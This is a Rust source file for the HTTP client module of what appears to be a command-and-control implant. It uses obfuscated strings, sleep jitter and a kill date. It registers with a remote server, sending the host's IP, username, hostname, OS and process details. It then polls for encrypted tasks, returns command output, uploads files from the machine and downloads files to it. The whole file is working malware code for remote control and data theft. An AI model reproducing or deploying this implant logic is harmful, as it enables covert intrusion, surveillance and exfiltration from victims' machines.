use base64::{engine::general_purpose::STANDARD, Engine as _};
use flate2::{read::ZlibDecoder, write::GzEncoder, Compression};
use fmtools::format; // using obfstr to obfuscate
use std::io::{Read, Write};

use super::{
    commands::whoami,
    config::{self, Config},
    crypto, http, win_utils,
};

pub(crate) struct Client {
    config: Config,
    pub(crate) id: String,
    pub(crate) initialized: bool,
    key: String,
    pub(crate) kill_date: String,
    pub(crate) registered: bool,
    pub(crate) sleep_jitter: f64,
    pub(crate) sleep_time: u32,
    pub(crate) user_agent: String,
}

impl Client {
    pub(crate) fn new(config: Config) -> Client {
        Client {
            config,
            id: String::new(),
            initialized: false,
            key: String::new(),
            kill_date: String::new(),
            registered: false,
            sleep_jitter: 0.0,
            sleep_time: 0,
            user_agent: String::new(),
        }
    }

    // Struct Initialization
    pub(crate) fn init(&mut self) -> Result<(), Box<dyn std::error::Error>> {
        // Initialize values
        self.kill_date = self.config.get_kill_date()?;
        self.sleep_jitter = self.config.get_sleep_jitter()? / 100.0;
        self.sleep_time = self.config.get_sleep_time()?;
        self.user_agent = self.config.get_http_user_agent()?;

        Ok(())
    }

    // Server Initialization (GET)
    pub(crate) fn server_init(&mut self) -> Result<(), Box<dyn std::error::Error>> {
        // Make the registration request
        let http_result = http::get_request(
            &(self.config.get_http_url()? + &self.config.get_path(&config::Path::Register)?),
            None,
            &self.user_agent,
            None,
        )?;

        // Parse the JSON response and save our ID
        let json_result: serde_json::Value = serde_json::from_str(&http_result)?;
        self.id = json_result["id"]
            .as_str()
            .ok_or_else(|| format!("Failed to get ID"))?
            .to_string();

        // Base64-decode and XOR the returned key
        let key_bytes = STANDARD.decode(
            json_result["k"]
                .as_str()
                .ok_or_else(|| format!("Failed to get key"))?,
        )?;

        // XOR-decode the transferred key
        let xored_bytes = crypto::xor_bytes(&key_bytes, config::get_xor_key());
        self.key = std::str::from_utf8(&xored_bytes[..])?.to_string();

        self.initialized = true;

        Ok(())
    }

    // Registration (POST)
    pub(crate) fn register(&mut self) -> Result<(), Box<dyn std::error::Error>> {
        let risky_mode = self.config.get_risky_mode()?;
        let register_data = format!(
            "{\"i\": \""
            {win_utils::get_local_ip()}
            "\", \"u\": \""
            {whoami::whoami()}
            "\", \"h\": \""
            {win_utils::get_hostname()}
            "\", \"o\": \""
            {win_utils::get_os()}
            "\", \"p\": "
            {win_utils::get_process_id()}
            ", \"P\": \""
            {win_utils::get_process_name()}
            "\", \"r\": "
            {risky_mode}
            "}"
        );

        // Make the request
        http::post_request(
            &(self.config.get_http_url()? + &self.config.get_path(&config::Path::Register)?),
            &format!("data"),
            &crypto::encrypt_data(&register_data.into_bytes(), self.key.as_bytes()),
            &self.id,
            &self.user_agent,
        )?;

        self.registered = true;
        Ok(())
    }

    // Command check-in (GET)
    pub(crate) fn get_command(
        &self,
    ) -> Result<(String, String, Vec<String>), Box<dyn std::error::Error>> {
        // Make the request
        let command_data = http::get_request(
            &(self.config.get_http_url()? + &self.config.get_path(&config::Path::Task)?),
            Some(&self.id),
            &self.user_agent,
            None,
        )?;

        // Parse the JSON response body to get the task data, if present
        let json_result: serde_json::Value = serde_json::from_str(&command_data)?;

        if json_result["t"] == serde_json::Value::Null {
            return Ok((String::new(), String::new(), Vec::new()));
        };

        // Decrypt the task data and parse the JSON
        let decrypted_command_data = crypto::decrypt_string(
            json_result["t"]
                .as_str()
                .ok_or_else(|| format!("Failed to get task data"))?
                .to_string(),
            self.key.as_bytes(),
        )?;

        let parsed_command_data: serde_json::Value = serde_json::from_str(&decrypted_command_data)?;

        // Get the guid, command, and args fields from the parsed JSON
        let guid = parsed_command_data["guid"]
            .as_str()
            .ok_or_else(|| format!("Failed to get guid"))?
            .to_string();

        let command = parsed_command_data["command"]
            .as_str()
            .ok_or_else(|| format!("Failed to get command"))?
            .to_string();

        let args = parsed_command_data["args"]
            .as_array()
            .ok_or_else(|| format!("Failed to get arguments"))?
            .iter()
            .map(|val| val.as_str().unwrap_or("").to_string())
            .collect::<Vec<String>>();

        // Return the guid, command, and args fields as a tuple
        Ok((guid, command, args))
    }

    // Command result submission (POST)
    pub(crate) fn post_command_result(
        &self,
        guid: &str,
        result: &str,
    ) -> Result<(), Box<dyn std::error::Error>> {
        let result_data = format!(
            "{\"guid\": \""
            {guid}
            "\", \"result\": \""
            {STANDARD.encode(result)}
            "\"}"
        );

        http::post_request(
            &(self.config.get_http_url()? + &self.config.get_path(&config::Path::Result)?),
            "data",
            &crypto::encrypt_data(&result_data.into_bytes(), self.key.as_bytes()),
            &self.id,
            &self.user_agent,
        )?;
        Ok(())
    }

    // File submission (for 'download' command) (POST)
    pub(crate) fn post_file(
        &self,
        guid: &str,
        data: &[u8],
    ) -> Result<(), Box<dyn std::error::Error>> {
        // Gzip deflate the data
        let mut encoder = GzEncoder::new(Vec::new(), Compression::default());
        encoder.write_all(data)?;
        let compressed_data = encoder.finish()?;

        // Encrypt the data
        let encrypted_data = crypto::encrypt_data(&compressed_data, self.key.as_bytes());

        http::post_upload_request(
            &(self.config.get_http_url()? + &self.config.get_path(&config::Path::Task)? + "/u"),
            &encrypted_data,
            &self.id,
            guid,
            &self.user_agent,
        )?;

        Ok(())
    }

    // File retrieval (for 'upload' command) (GET)
    pub(crate) fn get_file(
        &self,
        file_id: &str,
        guid: &str,
    ) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
        // Construct the URL
        let mut url = self.config.get_http_url()?;
        let path = self.config.get_path(&config::Path::Task)?;
        url = format!({url}{path}"/"{file_id});

        // Get the file
        let response = http::get_request(&url, Some(&self.id), &self.user_agent, Some(&guid));

        // Error if we didn't get HTTP 200
        if let Err(e) = response {
            return Err(format!("Something went wrong uploading the file: "{e}).into());
        };

        // Error if we got an empty body
        let response_body = response?;
        if response_body.is_empty() {
            return Err(format!("Empty response body").into());
        };

        // Decrypt the data
        let decrypted_data = crypto::decrypt_data(response_body, self.key.as_bytes())?;

        // Zlib inflate the data
        let mut decoder = ZlibDecoder::new(&decrypted_data[..]);
        let mut file_buffer = Vec::new();
        decoder.read_to_end(&mut file_buffer)?;

        // Return the decrypted data as Vec<u8>
        Ok(file_buffer)
    }

    // Generic decryption and decompression for incoming data
    #[cfg(feature = "risky")]
    pub(crate) fn decrypt_and_decompress(
        &self,
        encrypted_data: &str,
    ) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
        // Decrypt the data
        let decrypted_data = crypto::decrypt_data(encrypted_data.to_string(), self.key.as_bytes())?;

        // Zlib inflate the data
        let mut decoder = ZlibDecoder::new(&decrypted_data[..]);
        let mut plaintext = Vec::new();
        decoder.read_to_end(&mut plaintext)?;

        Ok(plaintext)
    }
}
